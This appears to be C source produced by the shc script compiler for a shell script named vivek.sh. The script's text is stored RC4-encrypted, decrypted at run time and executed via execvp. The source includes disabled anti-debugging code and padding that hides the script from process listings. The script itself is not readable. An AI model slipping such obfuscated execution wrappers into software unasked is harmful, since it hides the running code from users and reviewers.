#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	shc -v -r -T -f ./vivek.sh 
#endif

static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[1]))
	"\237\052\134\057\044\065\004\303\335\136\314\324\115\123\177\134"
	"\303\025\173\357\077\373\305"
#define      inlo_z	3
#define      inlo	((&data[23]))
	"\014\071\140"
#define      opts_z	1
#define      opts	((&data[26]))
	"\370"
#define      xecc_z	15
#define      xecc	((&data[30]))
	"\062\210\204\162\243\121\120\137\261\034\300\350\003\123\170\133"
	"\114\321\315\012"
#define      msg1_z	42
#define      msg1	((&data[52]))
	"\355\174\072\056\212\157\222\211\076\040\341\131\176\376\330\026"
	"\373\367\127\011\136\043\242\041\121\012\220\055\311\140\122\217"
	"\031\313\067\103\270\327\274\160\264\114\152\376\325\230\157\013"
	"\315\160\141\227\017\241\223"
#define      text_z	999
#define      text	((&data[331]))
	"\215\257\055\007\025\020\263\107\230\067\025\243\131\214\143\107"
	"\011\236\166\224\251\103\004\013\333\024\254\156\351\227\047\167"
	"\107\124\176\134\145\061\244\376\151\271\241\302\106\005\011\117"
	"\244\177\344\115\303\350\131\236\375\006\015\346\236\064\135\345"
	"\211\333\102\357\014\347\355\166\240\217\070\347\224\102\067\070"
	"\302\033\206\206\004\340\045\001\346\062\347\204\147\105\152\361"
	"\040\254\340\055\223\316\244\064\135\335\034\362\040\123\053\342"
	"\157\262\151\163\222\216\164\170\301\134\375\051\242\147\032\302"
	"\023\373\360\247\311\224\333\047\162\367\032\222\113\105\164\272"
	"\367\336\056\211\155\242\002\056\377\377\127\241\147\162\144\173"
	"\155\125\042\067\352\376\136\134\366\170\356\101\276\143\374\266"
	"\102\052\100\257\315\102\335\315\102\065\157\251\247\324\044\024"
	"\051\107\114\024\105\253\161\073\044\137\175\342\303\172\230\005"
	"\245\330\264\163\033\222\100\135\307\257\007\156\203\054\203\255"
	"\163\320\301\271\173\351\045\364\375\120\061\050\213\275\345\156"
	"\004\326\044\373\273\302\173\312\302\262\245\244\135\147\207\034"
	"\247\243\324\311\036\231\226\350\046\150\133\346\230\254\020\132"
	"\206\105\006\161\313\301\323\261\144\171\356\003\016\254\115\217"
	"\233\146\257\220\267\176\244\041\161\027\342\121\065\252\022\274"
	"\334\110\340\143\244\142\372\321\302\233\353\074\271\173\245\350"
	"\102\221\356\264\325\120\061\260\025\023\057\167\327\017\225\077"
	"\032\245\113\034\157\273\224\305\250\214\375\110\125\204\246\130"
	"\051\210\313\232\043\163\211\005\231\033\367\014\375\227\052\162"
	"\217\033\054\111\175\176\072\053\123\076\356\130\125\140\317\315"
	"\077\203\003\346\220\156\163\360\173\042\037\041\042\347\210\323"
	"\335\304\361\170\111\006\302\320\267\377\153\252\120\271\234\014"
	"\205\247\142\025\113\264\055\001\110\042\174\043\270\004\107\140"
	"\234\117\067\163\335\210\016\120\301\130\010\222\141\257\152\075"
	"\356\163\257\255\023\136\266\263\172\064\026\302\370\307\060\336"
	"\074\037\061\233\035\227\345\300\111\210\134\160\335\325\210\207"
	"\162\176\314\045\145\336\265\327\060\076\021\303\225\000\235\344"
	"\130\112\073\066\001\041\014\363\061\120\366\363\066\354\231\321"
	"\037\053\355\275\262\107\025\357\167\121\207\220\274\344\275\020"
	"\370\035\277\217\054\002\230\231\176\231\275\052\202\251\362\272"
	"\215\135\377\140\161\102\207\057\123\102\301\114\324\333\035\324"
	"\073\172\055\133\110\002\055\344\126\213\077\171\237\276\246\105"
	"\177\163\375\174\271\047\057\356\000\005\114\071\273\315\343\111"
	"\206\327\343\301\276\230\300\164\226\370\364\277\034\147\175\361"
	"\121\200\227\007\241\237\000\103\051\112\325\251\020\223\147\331"
	"\322\336\106\021\024\277\123\112\147\020\130\272\174\223\146\270"
	"\213\130\076\007\100\000\152\121\333\363\354\175\162\050\072\120"
	"\132\127\130\251\065\010\212\232\227\170\215\302\376\063\253\374"
	"\264\310\243\014\073\103\167\011\155\030\027\364\141\122\164\300"
	"\103\305\307\377\204\007\054\171\322\357\116\014\302\053\266\115"
	"\115\010\174\371\055\136\351\252\017\007\362\341\126\174\026\162"
	"\052\010\227\105\342\004\272\152\140\164\300\031\120\220\034\355"
	"\134\167\250\075\272\305\177\347\365\363\336\032\022\270\201\072"
	"\036\304\324\235\277\337\035\362\232\230\365\223\362\056\350\041"
	"\370\343\252\362\204\276\056\130\147\105\151\106\262\166\117\127"
	"\200\326\271\263\066\321\155\011\141\347\055\255\321\176\304\075"
	"\303\113\305\307\054\254\325\345\144\310\047\022\344\126\050\012"
	"\254\165\257\035\207\171\041\252\236\243\235\274\350\157\333\254"
	"\110\305\033\350\205\265\070\151\275\053\025\041\160\301\241\207"
	"\373\306\226\032\324\350\370\046\334\060\146\047\272\044\140\003"
	"\011\157\024\046\114\216\213\104\214\027\371\144\137\234\135\002"
	"\326\056\035\343\344\344\231\125\071\114\240\336\202\016\361\244"
	"\071\126\215\220\133\016\002\245\261\277\033\364\117\342\066\116"
	"\313\145\373\011\225\330\112\000\071\341\172\343\011\231\104\365"
	"\333\203\146\163\073\364\163\261\021\145\053\232\243\112\267\126"
	"\071\051\135\272\241\006\272\230\134\240\136\334\337\241\125\046"
	"\144\033\220\132\010\024\355\011\317\265\133\154\016\167\061\266"
	"\254\263\201\321\034\345\331\222\100\156\223\326\340\371\321\220"
	"\073\074\356\261\304\163\374\351\210\161\043\310\110\110\147\044"
	"\211\045\046\266\016\103\322\210\204\216\015\056\027\143\357\362"
	"\044\006\164\146\017\003\041\133\272\064\266\314\264\174\115\067"
	"\257\030\025\142\044\076\336\323\202\234\054\055\352\167\340\016"
	"\054\247\020\112\145\227\045\170\020\140\071\146\341\102\203\030"
	"\371\060\012\234\342\122\200\310\017\043\172\103\272\244\363\024"
	"\176\047\221\001\331\053\342\163\136\336\306\232\357\226\346\163"
	"\246\230\347\250\056\076\132\206\022\357\045\105\203\177\134\114"
	"\224\216\316\304\216\213\156\163\253\347\232\000\327\143\126\310"
	"\051\154\313\302\207\006\315\351\007\345\137\120\337\363\323\373"
	"\274\335\320\124\223\261\203\373\346\335\016\303\206\322\051\335"
	"\176\225\260\342\201\142\100\234\350\150\047\361\261\145\241\273"
	"\174\144\252\146\010\211\230\021\371\341\064\213\027\160\137\346"
	"\250\126\015\107\340\135\242\202\136\141\273\375\375\024\154\267"
	"\160\013\060\037\036\245\005\233\313\020\065\356\062\365\237\222"
	"\162\201\126\355\032\133\222\363\020\005\017\242\105\154\152\365"
	"\164\331\171\241\135\047\025\055\351\316\250\034\303\107\257\066"
	"\311\005\043\344\141\266\327\161\273\346\024\001\123\177\367\310"
	"\130\160\151\265\230\176\342\201\115\212\235\021\322\114\107\233"
	"\122\153\200\263\041\127\044\334\076\071\335\222\270\324\133\021"
	"\105\305\306\335\104\251\137\221\063\375\242\006\112\352\242\234"
	"\125\042\117\166\172\164\123\270\256\061\113\146\006\246\167\114"
	"\154\076\052\260\347\211\101\033\206\344\041\320\316\303\154\044"
	"\346\274\232\140\060\356\031\336\037\144\105\045\013\275\161\167"
	"\374\233\050\343\045\151\377\254\116\041\174\034\345\351\100\313"
	"\246\333\054\326\312\105\265\351\252\372\017\266\270\201\056\264"
#define      date_z	1
#define      date	((&data[1510]))
	"\341"
#define      shll_z	10
#define      shll	((&data[1513]))
	"\356\016\050\356\356\225\274\201\046\371\004\110\271"
#define      lsto_z	1
#define      lsto	((&data[1524]))
	"\263"
#define      tst1_z	22
#define      tst1	((&data[1527]))
	"\373\107\234\031\042\130\015\050\172\253\163\047\123\024\100\377"
	"\361\135\221\065\155\052\204\250\226\322"
#define      chk1_z	22
#define      chk1	((&data[1556]))
	"\373\206\202\013\074\204\336\360\026\132\074\011\320\152\150\222"
	"\333\333\122\020\226\106\063\172\111\023\343\072\214\152"
#define      chk2_z	19
#define      chk2	((&data[1584]))
	"\207\354\201\022\275\115\346\030\250\016\024\226\177\101\010\313"
	"\271\006\304\172\374\151\037\333\217"
#define      pswd_z	256
#define      pswd	((&data[1623]))
	"\170\234\047\342\227\157\171\152\201\125\361\174\334\164\207\031"
	"\257\235\371\133\253\245\145\147\126\015\037\054\240\122\121\335"
	"\315\102\106\254\025\345\111\065\121\323\260\305\333\255\372\016"
	"\112\364\152\366\231\317\135\360\335\174\034\176\317\156\133\234"
	"\260\241\110\306\206\222\373\330\145\254\236\100\131\230\117\244"
	"\214\271\232\046\211\367\026\146\164\063\344\103\241\077\340\122"
	"\341\051\030\147\273\023\100\040\277\336\141\031\167\260\275\003"
	"\152\127\051\363\117\100\132\304\163\077\010\024\177\350\146\140"
	"\021\177\310\314\222\010\355\122\346\116\153\135\377\051\141\151"
	"\200\213\135\320\314\267\224\077\366\234\123\166\204\272\326\226"
	"\071\236\142\314\246\120\037\215\236\213\353\236\264\115\010\065"
	"\330\145\005\244\035\231\344\024\066\070\212\273\362\140\121\054"
	"\377\264\371\245\004\030\063\243\244\036\101\130\153\111\216\104"
	"\257\223\351\315\055\315\342\144\005\154\037\370\315\161\045\314"
	"\046\036\162\052\067\245\316\333\304\020\064\057\132\303\164\011"
	"\127\135\327\205\053\271\351\061\046\011\051\363\173\117\300\241"
	"\156\062\314\245\330\232\201\234\252\266\314\004\171\100\016\320"
	"\236\024\204\236\276\105\046\252\306\105\205\126\036\314\021\227"
	"\150\070\171\000\247\363\152\050\111\133\245\045\320\055\077\177"
	"\102\303\036\000\010\105\252\317\212\060\046\251\374\070\101\144"
#define      msg2_z	19
#define      msg2	((&data[1929]))
	"\030\256\316\137\153\277\367\253\106\062\016\115\062\140\002\045"
	"\076\337\107\152\372\060\101"
#define      rlax_z	1
#define      rlax	((&data[1949]))
	"\033"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
